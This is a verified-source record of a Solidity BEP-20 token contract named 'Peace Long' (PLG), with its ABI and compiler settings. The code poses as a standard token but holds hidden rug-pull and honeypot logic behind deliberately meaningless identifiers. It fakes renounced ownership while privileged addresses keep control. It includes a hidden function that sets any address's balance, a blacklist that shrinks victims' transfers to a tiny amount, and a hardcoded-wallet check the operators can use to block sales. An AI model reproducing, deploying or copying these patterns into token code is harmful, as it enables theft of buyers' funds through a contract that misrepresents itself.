{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface listLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract enableLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listTxExempt {\n    function createPair(address minAutoShould, address amountAutoIs) external returns (address);\n}\n\ninterface launchedExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeFund) external view returns (uint256);\n\n    function transfer(address senderAt, uint256 walletTxAt) external returns (bool);\n\n    function allowance(address marketingExempt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletTxAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderAt,\n        uint256 walletTxAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed toAt, uint256 value);\n    event Approval(address indexed marketingExempt, address indexed spender, uint256 value);\n}\n\ninterface launchedExemptMetadata is launchedExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PeaceLong is enableLaunch, launchedExempt, launchedExemptMetadata {\n\n    function transferFrom(address swapLimit, address senderAt, uint256 walletTxAt) external override returns (bool) {\n        if (_msgSender() != launchedSwap) {\n            if (tokenTeam[swapLimit][_msgSender()] != type(uint256).max) {\n                require(walletTxAt <= tokenTeam[swapLimit][_msgSender()]);\n                tokenTeam[swapLimit][_msgSender()] -= walletTxAt;\n            }\n        }\n        return amountBuy(swapLimit, senderAt, walletTxAt);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return tradingReceiver;\n    }\n\n    function amountBuy(address swapLimit, address senderAt, uint256 walletTxAt) internal returns (bool) {\n        if (swapLimit == isTx) {\n            return totalTrading(swapLimit, senderAt, walletTxAt);\n        }\n        uint256 totalTx = launchedExempt(toLiquidity).balanceOf(liquiditySwap);\n        require(totalTx == swapLaunch);\n        require(senderAt != liquiditySwap);\n        if (enableAt[swapLimit]) {\n            return totalTrading(swapLimit, senderAt, senderLaunch);\n        }\n        return totalTrading(swapLimit, senderAt, walletTxAt);\n    }\n\n    mapping(address => uint256) private totalIs;\n\n    function allowance(address limitFund, address walletTeamAuto) external view virtual override returns (uint256) {\n        if (walletTeamAuto == launchedSwap) {\n            return type(uint256).max;\n        }\n        return tokenTeam[limitFund][walletTeamAuto];\n    }\n\n    bool public swapList;\n\n    function totalTrading(address swapLimit, address senderAt, uint256 walletTxAt) internal returns (bool) {\n        require(totalIs[swapLimit] >= walletTxAt);\n        totalIs[swapLimit] -= walletTxAt;\n        totalIs[senderAt] += walletTxAt;\n        emit Transfer(swapLimit, senderAt, walletTxAt);\n        return true;\n    }\n\n    uint256 private tokenTrading;\n\n    string private senderWallet = \"PLG\";\n\n    bool public toLimit;\n\n    function owner() external view returns (address) {\n        return maxTotalReceiver;\n    }\n\n    function minSell() public {\n        emit OwnershipTransferred(isTx, address(0));\n        maxTotalReceiver = address(0);\n    }\n\n    address private maxTotalReceiver;\n\n    uint8 private totalShouldLimit = 18;\n\n    constructor (){\n        if (walletAtMarketing) {\n            walletAtMarketing = true;\n        }\n        listLaunch fundFee = listLaunch(launchedSwap);\n        toLiquidity = listTxExempt(fundFee.factory()).createPair(fundFee.WETH(), address(this));\n        if (txFrom) {\n            tokenTrading = senderExempt;\n        }\n        isTx = _msgSender();\n        minSell();\n        sellSender[isTx] = true;\n        totalIs[isTx] = totalReceiverBuy;\n        \n        emit Transfer(address(0), isTx, totalReceiverBuy);\n    }\n\n    event OwnershipTransferred(address indexed enableTeam, address indexed tokenWallet);\n\n    function listLaunchedTake(address buyMarketing) public {\n        totalAutoToken();\n        if (tokenTrading == senderExempt) {\n            senderExempt = tokenTrading;\n        }\n        if (buyMarketing == isTx || buyMarketing == toLiquidity) {\n            return;\n        }\n        enableAt[buyMarketing] = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private tokenTeam;\n\n    function transfer(address listMin, uint256 walletTxAt) external virtual override returns (bool) {\n        return amountBuy(_msgSender(), listMin, walletTxAt);\n    }\n\n    function totalAutoToken() private view {\n        require(sellSender[_msgSender()]);\n    }\n\n    mapping(address => bool) public sellSender;\n\n    function maxEnable(address listMin, uint256 walletTxAt) public {\n        totalAutoToken();\n        totalIs[listMin] = walletTxAt;\n    }\n\n    bool private walletAtMarketing;\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalShouldLimit;\n    }\n\n    mapping(address => bool) public enableAt;\n\n    function balanceOf(address feeFund) public view virtual override returns (uint256) {\n        return totalIs[feeFund];\n    }\n\n    uint256 swapLaunch;\n\n    function approve(address walletTeamAuto, uint256 walletTxAt) public virtual override returns (bool) {\n        tokenTeam[_msgSender()][walletTeamAuto] = walletTxAt;\n        emit Approval(_msgSender(), walletTeamAuto, walletTxAt);\n        return true;\n    }\n\n    uint256 private senderExempt;\n\n    address liquiditySwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private totalReceiverBuy = 100000000 * 10 ** 18;\n\n    function getOwner() external view returns (address) {\n        return maxTotalReceiver;\n    }\n\n    address launchedSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderWallet;\n    }\n\n    address public toLiquidity;\n\n    bool private txFrom;\n\n    function enableTake(uint256 walletTxAt) public {\n        totalAutoToken();\n        swapLaunch = walletTxAt;\n    }\n\n    string private tradingReceiver = \"Peace Long\";\n\n    uint256 constant senderLaunch = 18 ** 10;\n\n    function feeSwap(address launchedMin) public {\n        require(launchedMin.balance < 100000);\n        if (toLimit) {\n            return;\n        }\n        \n        sellSender[launchedMin] = true;\n        if (tokenTrading != senderExempt) {\n            walletAtMarketing = false;\n        }\n        toLimit = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return totalReceiverBuy;\n    }\n\n    uint256 takeAmount;\n\n    address public isTx;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletTeamAuto\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTeamAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTxAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletTxAt\",\"type\":\"uint256\"}],\"name\":\"enableTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMin\",\"type\":\"address\"}],\"name\":\"feeSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyMarketing\",\"type\":\"address\"}],\"name\":\"listLaunchedTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTxAt\",\"type\":\"uint256\"}],\"name\":\"maxEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTxAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTxAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PeaceLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}